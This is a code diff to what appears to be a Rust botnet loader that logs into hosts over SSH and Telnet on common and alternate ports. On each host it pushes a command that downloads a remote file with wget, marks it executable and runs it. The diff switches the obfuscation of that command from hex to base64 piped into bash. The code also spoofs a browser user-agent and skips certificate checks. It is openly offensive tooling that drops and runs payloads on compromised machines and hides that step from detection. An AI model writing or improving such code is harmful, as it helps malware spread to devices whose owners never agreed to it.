@@ -7,7 +7,7 @@ use telnet::{Telnet, Event};
 use threadpool::ThreadPool;
 use ssh2::Session;
 use std::io;
-use hex;
+use base64;
 
 const SSH_PORTS: [u16; 4] = [22, 2222, 10001, 50000];
 const TELNET_PORTS: [u16; 4] = [23, 2323, 4000, 5560];
@@ -354,6 +354,8 @@ fn reconnect_via_telnet(ip: &str, port: u16, user: &str, password: &str) -> Resu
     }
 }
 
+use base64;
+
 fn echo_load_telnet(telnet: &mut Telnet, url: &str, filename: &str) -> Result<(), String> {
     let wget_command = format!(
         "wget --limit-rate=1m --no-check-certificate --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36\" \
@@ -362,14 +364,18 @@ fn echo_load_telnet(telnet: &mut Telnet, url: &str, filename: &str) -> Result<()
         --header=\"DNT: 1\" {} -O {} && chmod +x {} && ./{}", url, filename, filename, filename
     );
 
-    let hex_command = hex::encode(wget_command);
-    let full_command = format!("echo {} | xxd -r -p | bash\n", hex_command);
-    telnet.write(full_command.as_bytes()).map_err(|_e| format!("\x1b[91mFailed to send wget command via Telnet\x1b[0m"))?;
+    let base64_command = base64::encode(wget_command);
+    let full_command = format!("echo {} | base64 -d | bash\n", base64_command);
 
-    telnet.read().map_err(|_e| format!("\x1b[91mFailed to read response after sending wget command\x1b[0m"))?;
+    telnet.write(full_command.as_bytes())
+        .map_err(|_e| "\x1b[91mFailed to send wget command via Telnet\x1b[0m".to_string())?;
+
+    telnet.read()
+        .map_err(|_e| "\x1b[91mFailed to read response after sending wget command\x1b[0m".to_string())?;
 
     Ok(())
 }
+
 
 fn echo_load_ssh(session: &Session, url: &str, filename: &str) -> Result<(), String> {
     let wget_command = format!(
@@ -379,8 +385,9 @@ fn echo_load_ssh(session: &Session, url: &str, filename: &str) -> Result<(), Str
         --header=\"DNT: 1\" {} -O {} && chmod +x {} && ./{}", url, filename, filename, filename
     );
 
-    let hex_command = hex::encode(wget_command);
-    let full_command = format!("echo {} | xxd -r -p | bash\n", hex_command);
+    let base64_command = base64::encode(wget_command);
+    let full_command = format!("echo {} | base64 -d | bash\n", base64_command);
+
     let mut channel = session.channel_session()
         .map_err(|_e| "\x1b[91mFailed to open SSH channel\x1b[0m".to_string())?;
     
